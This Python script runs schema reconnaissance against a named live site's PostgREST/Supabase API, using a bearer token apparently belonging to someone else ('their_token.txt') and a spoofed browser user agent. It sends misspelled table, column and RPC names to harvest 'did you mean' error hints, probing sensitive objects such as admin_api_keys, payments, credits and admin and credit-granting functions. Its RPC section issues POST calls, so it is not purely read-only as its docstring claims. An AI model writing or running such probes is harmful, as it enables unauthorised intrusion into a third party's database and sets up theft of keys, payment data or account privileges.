#!/usr/bin/env python3
"""Read-only schema enumeration via PostgREST error hints (PGRST205 table 'did you mean',
PGRST204 column did-you-mean, PGRST202 function hint)."""
import ssl, json, time, http.cookiejar, urllib.request, urllib.error

CTX = ssl.create_default_context()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
BASE = "https://onlyfakeai.ru/api/supabase/rest/v1"
KEY = "<publishable-key>"
TOK = json.load(open("their_token.txt"))["access_token"]
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=CTX),
                                 urllib.request.HTTPCookieProcessor(cj))
AUTH = {"apikey": KEY, "Authorization": "Bearer " + TOK}


def g(path, extra=None):
    h = {"User-Agent": UA}
    h.update(AUTH)
    h.update(extra or {})
    rq = urllib.request.Request(BASE + path, headers=h)
    try:
        with op.open(rq, timeout=20) as x:
            return x.status, x.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return 0, str(e).encode()


print("== A) table-name typo hints (PGRST205 'perhaps you meant') ==")
probes = ["profil", "profilez", "job", "jobz", "message", "messagez", "admin_api_key",
          "admin_api_keysz", "admins", "user", "users", "credit", "credits", "payment",
          "payments", "plan", "plans", "token", "tokens", "session", "sessions", "setting",
          "settings", "config", "configs", "broadcast", "broadcasts", "notif", "notifications",
          "template", "templates", "photo", "photos", "background", "backgrounds", "stats",
          "analytics", "audit", "logs", "queue", "worker", "servers", "apikeys", "api_key"]
seen = set()
for p in probes:
    st, b = g(f"/{p}?select=*&limit=0")
    t = b.decode("utf-8", "ignore")
    if st == 404 and ("PGRST205" in t or "schema cache" in t):
        print(f"  {p}: {t[:230]}")
    elif st not in (404,):
        print(f"  {p}: [{st}] {t[:160]}")
    time.sleep(0.28)

print("\n== B) column typo hints on known tables ==")
for t, cols in [("messages", ["propmt", "modell", "image_ur", "conversation_i", "user_i"]),
                ("admin_api_keys", ["key_prefi", "key_has", "admin_user_i"]),
                ("profiles", ["generations_lef", "activePla", "rolee"])]:
    for c in cols:
        st, b = g(f"/{t}?select={c}&limit=0")
        txt = b.decode("utf-8", "ignore")
        print(f"  {t}.{c}: [{st}] {txt[:200]}")
        time.sleep(0.28)

print("\n== C) function-name typo hints (PGRST202) via RPC ==")
def rpc(name):
    rq = urllib.request.Request(f"{BASE}/rpc/{name}", headers={**AUTH, "Content-Type": "application/json"},
                                data=b"{}", method="POST")
    try:
        with op.open(rq, timeout=20) as x:
            return x.status, x.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
for n in ["is_admi", "get_jobs_time_serie", "grant_plan_credit", "deduct_credit",
          "get_total_count", "get_recent_activit", "credit_tokens_after_paymen"]:
    st, b = rpc(n)
    print(f"  rpc/{n}: [{st}] {b.decode('utf-8','ignore')[:260]}")
    time.sleep(0.3)
